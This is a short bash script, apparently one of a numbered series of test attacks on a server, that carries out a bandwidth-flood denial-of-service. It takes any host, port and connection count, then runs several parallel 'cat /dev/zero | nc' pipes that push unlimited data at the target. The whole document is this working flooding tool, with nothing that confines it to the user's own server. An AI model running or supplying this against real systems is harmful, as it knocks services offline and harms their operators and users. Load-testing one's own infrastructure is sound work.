#!/bin/bash
# Attack 3: Bandwidth Flood
# Sends data as fast as possible to exhaust server bandwidth

HOST=${1:-localhost}
PORT=${2:-9009}
CONNECTIONS=${3:-10}

echo "🚨 Bandwidth Flood Attack"
echo "Target: $HOST:$PORT"
echo "Connections: $CONNECTIONS"
echo ""
echo "Flooding server with data from $CONNECTIONS connections..."
echo "Press Ctrl+C to stop"
echo ""

# Launch multiple connections flooding with data
for i in $(seq 1 $CONNECTIONS); do
    echo "Starting flood connection $i..."
    (cat /dev/zero | nc $HOST $PORT) &
done

echo ""
echo "All flood connections active!"
echo "Monitor bandwidth with: iftop or nethogs"

# Wait for user to stop
wait
